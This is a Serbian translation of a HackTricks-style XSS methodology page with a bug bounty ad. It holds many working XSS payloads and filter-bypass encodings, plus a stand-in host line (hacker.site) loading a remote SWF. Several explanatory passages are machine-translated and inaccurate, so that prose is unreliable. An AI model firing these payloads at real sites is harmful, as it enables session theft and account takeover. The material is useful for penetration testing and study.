# XSS (Cross Site Scripting)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**Savet za bug bounty**: **Prijavite se** na **Intigriti**, premium platformu za bug bounty koju su kreirali hakeri, za hakerima! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Metodologija

1. Proverite da li se **bilo koja vrednost kojom upravljate** (_parametri_, _putanja_, _zaglavlja_?, _kolačići_?) reflektuje u HTML-u ili se koristi u JS kodu.
2. **Pronađite kontekst** u kojem se reflektuje/koristi.
3. Ako je **reflektovano**
1. Proverite **koje simbole možete koristiti** i na osnovu toga pripremite payload:
1. U **sirovom HTML-u**:
1. Možete li kreirati nove HTML oznake?
2. Možete li koristiti događaje ili atribute koji podržavaju `javascript:` protokol?
3. Možete li zaobići zaštitu?
4. Da li se HTML sadržaj interpretira od strane bilo kog JS klijentskog motora (_AngularJS_, _VueJS_, _Mavo_...), možete zloupotrebiti [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Ako ne možete kreirati HTML oznake koje izvršavaju JS kod, možete li zloupotrebiti [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/)?
2. Unutar **HTML oznake**:
1. Možete li izaći u sirovi HTML kontekst?
2. Možete li kreirati nove događaje/atrtribute da izvršite JS kod?
3. Da li atribut u kojem ste zarobljeni podržava izvršavanje JS koda?
4. Možete li zaobići zaštitu?
3. Unutar **JavaScript koda**:
1. Možete li izbeći `<script>` oznaku?
2. Možete li izbeći string i izvršiti drugačiji JS kod?
3. Da li su vaši unosi u šablonskim literali \`\`?
4. Možete li zaobići zaštitu?
4. Izvršavanje JavaScript **funkcije**
1. Možete naznačiti ime funkcije koju želite da izvršite. npr.: `?callback=alert(1)`
4. Ako se **koristi**:
1. Možete iskoristiti **DOM XSS**, obratite pažnju kako se kontroliše vaš unos i da li se vaš **kontrolisani unos koristi od strane nekog izvora.**

Kada radite na složenom XSS-u, može biti korisno znati o:

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## Reflektovane vrednosti

Da biste uspešno iskoristili XSS, prva stvar koju trebate pronaći je **vrednost kojom upravljate, a koja se reflektuje** na veb stranici.

* **Delimično reflektovano**: Ako otkrijete da se vrednost parametra ili čak putanje reflektuje na veb stranici, možete iskoristiti **Reflektovani XSS**.
* **Skladišteno i reflektovano**: Ako otkrijete da je vrednost kojom upravljate sačuvana na serveru i reflektuje se svaki put kada pristupite stranici, možete iskoristiti **Skladišteni XSS**.
* **Pristup preko JS**: Ako otkrijete da se vrednost kojom upravljate pristupa putem JS-a, možete iskoristiti **DOM XSS**.

## Konteksti

Kada pokušavate iskoristiti XSS, prva stvar koju trebate znati je **gde se reflektuje vaš unos**. Zavisno od konteksta, moći ćete izvršiti proizvoljan JS kod na različite načine.

### Sirovi HTML

Ako se vaš unos **reflektuje na sirovom HTML-u** stranice, moraćete zloupotrebiti neku **HTML oznaku** kako biste izvršili JS kod: `<img , <iframe , <svg , <script` ... ovo su samo neke od mnogih mogućih HTML oznaka koje možete koristiti.\
Takođe, imajte na umu [Client Side Template Injection](../client-side-template-injection-csti.md).

### Unutar atributa HTML oznake

Ako se vaš unos reflektuje unutar vrednosti atributa oznake, možete pokušati:

1. Da **izađete iz atributa i iz oznake** (tada ćete biti u sirovom HTML-u) i kreirate novu HTML oznaku za zloupotrebu: `"><img [...]`
2. Ako **možete izaći iz atributa, ali ne i iz oznake** (`>` je kodiran ili izbrisan), zavisno od oznake možete **kreirati događaj** koji izvršava JS kod: `" autofocus onfocus=alert(1) x="`
3. Ako **ne možete izaći iz atributa** (`"` je kodiran ili izbrisan), onda zavisno od **kojeg atributa** se reflektuje vaša vrednost i **da li kontrolišete celu vrednost ili samo deo**, moći ćete je zloupotrebiti. Na **primer**, ako kontrolišete događaj poput `onclick=`, moći ćete ga naterati da izvrši proizvoljni kod kada se klikne. Još jedan interesantan **primer** je atribut `href`, gde možete koristiti `javascript:` protokol za izvršavanje proizvoljnog koda: **`href="javascript:alert(1)"`**
4. Ako se vaš unos reflektuje unutar "**neiskorišćenih oznaka**", možete pokušati trik sa **`accesskey`** da iskoristite ranjivost (treba vam neka vrsta socijalnog inženjeringa da biste iskoristili ovo): **`" accesskey="x" onclick="alert(1)" x="`**

### Unutar JavaScript koda

U ovom slučaju, vaš unos se reflektuje između oznaka **`<script> [...] </script>`** HTML stranice, unutar `.js` datoteke ili unutar atributa koristeći **`javascript:`** protokol:

* Ako se reflektuje između oznaka **`<script> [...] </script>`**, čak i ako je vaš unos unutar bilo kakvih navodnika, možete pokušati da ubacite `</script>` i izađete iz ovog konteksta. Ovo funkcioniše zato što će **pregledač prvo analizirati HTML oznake**, a zatim sadržaj, stoga neće primetiti da je vaš ubačeni `</script>` tag unutar HTML koda.
* Ako se reflektuje **unutar JS stringa** i prethodni trik ne funkcioniše, moraćete **izaći** iz stringa, **izvršiti** svoj kod i **rekonstruisati** JS kod (ako postoji greška, neće biti izvršena):
* `'-alert(1)-'`
* `';-alert(1)//`
* `\';alert(1)//`
* Ako se reflektuje unutar šablonskih literala, možete **ugraditi JS izraze** koristeći sintaksu `${ ... }`: `` var greetings = `Hello, ${alert(1)}` ``
* **Unicode enkodiranje** funkcioniše za pisanje **validnog JavaScript koda**:
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Podizanje JavaScript-a

Podizanje JavaScript-a se odnosi na mogućnost **deklarisanja funkcija, promenljivih ili klasa nakon njihove upotrebe, tako da možete iskoristiti situacije u kojima XSS koristi nedeklarisane promenljive ili funkcije.**\
**Proverite sledeću stranicu za više informacija:**

{% content-ref url="js-hoisting.md" %}
[js-hoisting.md](js-hoisting.md)
{% endcontent-ref %}

### JavaScript funkcija

Nekoliko web stranica ima endpointe koji **prihvataju ime funkcije kao parametar za izvršavanje**. Uobičajeni primer koji se može videti je nešto poput: `?callback=callbackFunc`.

Dobar način da saznate da li nešto što je direktno dato od strane korisnika pokušava da se izvrši je **izmena vrednosti parametra** (na primer, na 'Vulnerable') i traženje grešaka u konzoli kao što je:

![](<../../.gitbook/assets/image (651) (2).png>)

U slučaju da je ranjiv, možete **pokrenuti upozorenje** samo slanjem vrednosti: **`?callback=alert(1)`**. Međutim, vrlo je uobičajeno da ovi endpointi **validiraju sadržaj** i dozvoljavaju samo slova, brojeve, tačke i donje crte (**`[\w\._]`**).

Međutim, čak i sa tom ograničenjem, još uvek je moguće izvršiti neke radnje. To je zato što možete koristiti te ispravne karaktere da **pristupite bilo kom elementu u DOM-u**:

![](<../../.gitbook/assets/image (662).png>)

Nekoliko korisnih funkcija za ovo:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Takođe možete pokušati da **pokrenete JavaScript funkcije** direktno: `obj.sales.delOrders`.

Međutim, obično su endpointi koji izvršavaju navedenu funkciju endpointi bez mnogo zanimljivog DOM-a, **druge stranice na istom izvoru** će imati **zanimljiviji DOM** kako bi se izvršile više radnji.

Stoga, kako biste **zloupotrebili ovu ranjivost u drugom DOM-u**, razvijena je eksploatacija **Same Origin Method Execution (SOME)**:

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

Postoji **JS kod** koji nesigurno koristi neke podatke koje kontroliše napadač, poput `location.href`. Napadač može zloupotrebiti ovo da izvrši proizvoljan JS kod.

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **Universalni XSS**

Ovaj tip XSS-a može se pronaći **bilo gde**. Ne zavisi samo o iskorišćavanju klijenta veb aplikacije već o **bilo kom** **kontekstu**. Ovaj tip **proizvoljnog izvršavanja JavaScripta** čak se može zloupotrebiti za dobijanje **RCE**, **čitanje** **proizvoljnih** **fajlova** na klijentima i serverima, i još mnogo toga.\
Neki **primeri**:

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## Bypass WAF kodiranje slike

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## Ubacivanje unutar sirovog HTML-a

Kada se vaš unos reflektuje **unutar HTML stranice** ili možete izbeći i ubaciti HTML kod u ovom kontekstu, **prva** stvar koju treba da uradite je da proverite da li možete zloupotrebiti `<` da biste kreirali nove oznake: Jednostavno pokušajte da **reflektujete** tu **karakteristiku** i proverite da li je **HTML kodiran** ili **obrisan** ili se **reflektuje bez promena**. **Samo u poslednjem slučaju ćete moći iskoristiti ovaj slučaj**.\
Za ove slučajeve takođe **imajte na umu** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Napomena: HTML komentar se može zatvoriti koristeći `-->` ili `--!>`**_

U ovom slučaju, ako se ne koristi crna/bela lista, možete koristiti payloade kao što su:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
Ali, ako se koristi crna/bela lista oznaka/atributa, moraćete da **brute-force-ujete koje oznake** možete kreirati.\
Kada ste **pronašli koje oznake su dozvoljene**, moraćete da **brute-force-ujete atribute/događaje** unutar pronađenih validnih oznaka da biste videli kako možete napasti kontekst.

### Brute-force oznaka/događaja

Idite na [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) i kliknite na _**Kopiraj oznake u clipboard**_. Zatim, pošaljite sve njih koristeći Burp intruder i proverite da li je neka oznaka otkrivena kao zlonamerna od strane WAF-a. Kada otkrijete koje oznake možete koristiti, možete **brute-force-ovati sve događaje** koristeći validne oznake (na istoj veb stranici kliknite na _**Kopiraj događaje u clipboard**_ i pratite isti postupak kao pre).

### Prilagođene oznake

Ako niste pronašli nijednu validnu HTML oznaku, možete pokušati da **kreirate prilagođenu oznaku** i izvršite JS kod sa atributom `onfocus`. U XSS zahtevu, trebate završiti URL sa `#` da biste stranica **fokusirala na taj objekat** i **izvršila** kod:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Bypass-ovi crne liste

Ako se koristi neka vrsta crne liste, možete pokušati da je zaobiđete koristeći neke smešne trikove:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Bypass dužine (mali XSS-ovi)

{% hint style="info" %}
**Više malih XSS-ova za različite okruženja** payload [**može se pronaći ovde**](https://github.com/terjanq/Tiny-XSS-Payloads) i [**ovde**](https://tinyxss.terjanq.me).
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
Poslednji način je korišćenje 2 Unicode karaktera koji se proširuju na 5: telsr\
Više ovakvih karaktera možete pronaći [ovde](https://www.unicode.org/charts/normalization/).\
Da biste proverili koje karaktere dekomponujete, proverite [ovde](https://www.compart.com/en/unicode/U+2121).

### Klik XSS - Klikjacking

Ako za iskorišćavanje ranjivosti trebate **korisnika da klikne na link ili formu** sa unapred popunjenim podacima, možete pokušati da zloupotrebite [**Klikjacking**](../clickjacking.md#xss-clickjacking) (ako je stranica ranjiva).

### Nemoguće - Dangling Markup

Ako mislite da je **nemoguće kreirati HTML tag sa atributom za izvršavanje JS koda**, trebali biste proveriti [**Dangling Markup**](../dangling-markup-html-scriptless-injection/) jer možete **iskoristiti** ranjivost **bez** izvršavanja **JS** koda.

## Ubacivanje unutar HTML taga

### Unutar taga/izlazak iz vrednosti atributa

Ako se nalazite **unutar HTML taga**, prva stvar koju možete pokušati je da **izađete** iz taga i koristite neke od tehnika pomenutih u [prethodnom odeljku](./#injecting-inside-raw-html) za izvršavanje JS koda.\
Ako **ne možete izaći iz taga**, možete kreirati nove atribute unutar taga kako biste pokušali izvršiti JS kod, na primer koristeći neki payload kao (_napomena da u ovom primeru dvostruki navodnici se koriste za izlazak iz atributa, nećete ih trebati ako se vaš unos direktno reflektuje unutar taga_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Stilska događanja**

Stilska događanja su tehnike koje se koriste u napadima XSS (Cross-Site Scripting) kako bi se izvršio zlonamerni kod na ciljnom veb sajtu. Ove tehnike iskorišćavaju događaje koji se aktiviraju prilikom interakcije korisnika sa veb stranicom, kao što su klikovi mišem, unos teksta ili promene fokusa.

Napadač može da ubaci zlonamerni kod u HTML elemente koji podržavaju stilove, kao što su `<style>` ili `<link>`. Kada se događanje aktivira, zlonamerni kod se izvršava, omogućavajući napadaču da izvede različite vrste napada, kao što su krađa kolačića, preusmeravanje korisnika na zlonamerne sajtove ili izvršavanje akcija u ime korisnika.

Da bi se izvršio napad pomoću stilskih događanja, napadač mora da ubaci zlonamerni kod u HTML elemente koji podržavaju stilove i da pronađe način da korisnika navede da aktivira događanje. Ovo se može postići putem manipulacije URL parametara, formi za unos ili drugih interaktivnih elemenata na veb stranici.

Kako bi se zaštitili od napada XSS putem stilskih događanja, preporučuje se sanitizacija i validacija svih korisničkih unosa, kao i korišćenje odgovarajućih bezbednosnih mehanizama na veb serveru i aplikaciji. Takođe je važno redovno ažurirati softver i pratiti najnovije bezbednosne preporuke i zakrpe.
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Unutar atributa

Čak i ako **ne možete izbeći atribut** (`"` se enkodira ili briše), zavisno od **kojeg atributa** se reflektuje vaša vrednost, da li kontrolišete celu vrednost ili samo deo, moći ćete da je zloupotrebite. Na **primer**, ako kontrolišete događaj poput `onclick=`, moći ćete da ga naterate da izvrši proizvoljni kod kada se klikne.\
Još jedan interesantan **primer** je atribut `href`, gde možete koristiti `javascript:` protokol za izvršavanje proizvoljnog koda: **`href="javascript:alert(1)"`**

**Bypass unutar događaja koristeći HTML enkodiranje/URL enkodiranje**

**HTML enkodirani karakteri** unutar vrednosti atributa HTML oznaka se **dekodiraju tokom izvršavanja**. Stoga će nešto poput sledećeg biti validno (payload je podebljan): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Imajte na umu da je **svaka vrsta HTML enkodiranja validna**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Napomena da će URL enkodiranje takođe funkcionisati:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypassiranje unutrašnjeg događaja korišćenjem Unicode enkodiranja**

Ako je unutrašnji događaj filtriran, možete pokušati da ga zaobiđete koristeći Unicode enkodiranje. Na taj način možete umetnuti JavaScript kod unutar atributa događaja koji će biti izvršen prilikom pokretanja događaja.

Na primer, umesto da koristite običan kod za događaj `onclick`, možete koristiti Unicode enkodiranu verziju `onclick` kako biste zaobišli filtere. Na taj način, kod će biti izvršen čak i ako je unutrašnji događaj filtriran.

Evo primera kako to možete uraditi:

```html
<button onclick=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>Click me</button>
```

U ovom primeru, JavaScript kod `alert('XSS')` je enkodiran koristeći Unicode enkodiranje i umetnut je unutar atributa `onclick`. Kada korisnik klikne na dugme, JavaScript kod će biti izvršen i prikazaće se upozorenje "XSS".

Ova tehnika može biti korisna kada se susretnete sa filtriranjem unutrašnjih događaja i želite da zaobiđete takve filtere.
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Posebni protokoli unutar atributa

Ovde možete koristiti protokole **`javascript:`** ili **`data:`** na nekim mestima da biste **izvršili proizvoljni JS kod**. Neki će zahtevati interakciju korisnika, dok drugi neće.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Mesta gde možete ubaciti ove protokole**

**Opšte** gledano, `javascript:` protokol se može **koristiti u bilo kojoj oznaci koja prihvata atribut `href`** i u **većini** oznaka koje prihvataju atribut `src` (ali ne i `<img`).
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Drugi trikovi za prikrivanje**

_**U ovom slučaju, trikovi kodiranja HTML-om i Unicode kodiranja iz prethodnog odeljka takođe su validni jer se nalazite unutar atributa.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Osim toga, postoji još jedan **koristan trik** za ove slučajeve: **Čak i ako je vaš unos unutar `javascript:...` URL enkodiran, biće URL dekodiran pre nego što se izvrši.** Dakle, ako trebate **izbeći** iz **stringa** koristeći **jednostruki navodnik** i primetite da je **URL enkodiran**, zapamtite da **nije važno**, biće **tumačen** kao **jednostruki navodnik** tokom **izvršavanja**.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Imajte na umu da ako pokušate **koristiti i** `URLencode + HTMLencode` u bilo kom redosledu za enkodiranje **payloada**, to **neće** **raditi**, ali možete ih **mešati unutar payloada**.

**Korišćenje heksadecimalnog i oktalnog enkodiranja sa `javascript:`**

Možete koristiti **heksadecimalno** i **oktalno enkodiranje** unutar atributa `src` elementa `iframe` (barem) da biste deklarisali **HTML oznake za izvršavanje JS koda**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing

Reverse tab nabbing (обратno preuzimanje kartice) je tehnika napada koja se koristi u okviru XSS (Cross-Site Scripting) napada. Ova tehnika omogućava napadaču da preuzme kontrolu nad prethodno otvorenom karticom u veb pregledaču žrtve.

Kada žrtva poseti zaraženu veb stranicu koja sadrži zlonamerni skript, skript može da promeni URL stranice u URL napadačeve stranice. Kada žrtva pređe na drugu karticu, a zatim se vrati na prethodnu karticu, skript može da izvrši zlonamernu radnju, kao što je krađa osetljivih podataka ili izvršavanje drugih napada.

Da bi se zaštitili od reverse tab nabbing napada, preporučuje se korišćenje odgovarajućih sigurnosnih mera, kao što su redovno ažuriranje veb pregledača, korišćenje sigurnosnih dodataka i pažljivo otvaranje nepoznatih ili sumnjivih veb stranica.
```javascript
<a target="_blank" rel="opener"
```
Ako možete ubaciti bilo koji URL u proizvoljni **`<a href=`** tag koji sadrži atribute **`target="_blank"`** i **`rel="opener"`**, proverite **sledeću stranicu da biste iskoristili ovu funkcionalnost**:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### Bypass na događajnim rukovaocima

Prvo proverite ovu stranicu ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) za korisne **"on" događajne rukovaoce**.\
U slučaju da postoji neka crna lista koja sprečava kreiranje ovih događajnih rukovaoca, možete pokušati sledeće zaobilaženje:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS u "Nepodložnim oznakama" (skriveni unos, veza, kanonska, meta)

Sa [**ovde**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **sada je moguće zloupotrebiti skrivene unose sa:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
I u **meta oznakama**:
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Odavde možete izvršiti **XSS payload unutar skrivenog atributa**, pod uslovom da **ubedite** **žrtvu** da pritisne **kombinaciju tastera**. Na Firefoxu za Windows/Linux kombinacija tastera je **ALT+SHIFT+X**, a na OS X-u je **CTRL+ALT+X**. Možete specificirati drugu kombinaciju tastera koristeći drugi ključ u atributu za pristup ključu. Evo vektora:
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload će biti nešto poput ovoga: `" accesskey="x" onclick="alert(1)" x="`**

### Bypassiranje crne liste

Već su izloženi neki trikovi korišćenjem različitih kodiranja unutar ove sekcije. Vratite se **nazad da biste naučili gde možete koristiti:**

* **HTML kodiranje (HTML tagovi)**
* **Unicode kodiranje (može biti validan JS kod):** `\u0061lert(1)`
* **URL kodiranje**
* **Heksadecimalno i oktalno kodiranje**
* **data kodiranje**

**Bypassiranje za HTML tagove i atribute**

Pročitajte [Bypassiranje crne liste iz prethodne sekcije](./#bypassiranje-crne-liste).

**Bypassiranje za JavaScript kod**

Pročitajte [JavaScript bypassiranje crne liste iz sledeće sekcije](./#javascript-bypassiranje-tehnika-crne-liste).

### CSS-Gadžeti

Ako ste pronašli **XSS u vrlo malom delu** veba koji zahteva neku vrstu interakcije (možda mali link u podnožju sa onmouseover elementom), možete pokušati da **modifikujete prostor koji element zauzima** kako biste maksimizirali verovatnoću da se link aktivira.

Na primer, možete dodati neko stilizovanje elementu kao što je: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Ali, ako WAF filtrira stilski atribut, možete koristiti CSS stilizovane gadžete, pa ako pronađete, na primer

> .test {display:block; color: blue; width: 100%\}

i

> \#someid {top: 0; font-family: Tahoma;}

Sada možete modifikovati naš link i dovesti ga u oblik

> \<a href="" id=someid class=test onclick=alert() a="">

Ovaj trik je preuzet sa [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Ubacivanje unutar JavaScript koda

U ovim slučajevima, vaš **unos** će biti **reflektovan unutar JS koda** `.js` fajla ili između `<script>...</script>` tagova ili između HTML događaja koji mogu izvršiti JS kod ili između atributa koji prihvataju `javascript:` protokol.

### Eskapiranje \<script> taga

Ako se vaš kod ubacuje unutar `<script> [...] var input = 'reflektovani podaci' [...] </script>` možete jednostavno **izbeći zatvaranje `<script>`** taga:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Napomena da u ovom primeru **nismo ni zatvorili jednostruki navodnik**. To je zato što se **HTML parsiranje prvo vrši u pregledaču**, što uključuje identifikaciju elemenata stranice, uključujući blokove skripti. Parsiranje JavaScripta da bi se razumela i izvršila ugrađena skripta se vrši tek nakon toga.

### Unutar JS koda

Ako se `<>` sanitizuju, još uvek možete **izbeći string** gde se vaš unos **nalazi** i **izvršiti proizvoljni JS**. Važno je **ispraviti sintaksu JS-a**, jer ako postoje greške, JS kod neće biti izvršen:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### Шаблонски литерали \`\`

Da biste konstruisali **stringove** osim jednostrukih i dvostrukih navodnika, JS takođe prihvata **backticks** **` `` `**. Ovo se naziva šablonski literali jer omogućavaju da se **ugrađuju JS izrazi** koristeći sintaksu `${ ... }`.\
Stoga, ako primetite da se vaš unos **reflektuje** unutar JS stringa koji koristi backticks, možete zloupotrebiti sintaksu `${ ... }` da biste izvršili **proizvoljni JS kod**:

Ovo se može **zloupotrebiti** koristeći:
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### Izvršavanje enkodiranog koda

Kada se susretnete sa XSS ranjivošću koja filtrira određene znakove, možete pokušati izvršiti enkodirani kod kako biste zaobišli filtriranje. Ova tehnika se naziva izvršavanje enkodiranog koda.

Da biste to postigli, možete koristiti različite tehnike enkodiranja, kao što su HTML enkodiranje, URL enkodiranje ili JavaScript enkodiranje. Cilj je da se kod enkodira na način koji će proći kroz filtere, ali će se i dalje izvršiti kada se prikaže na stranici.

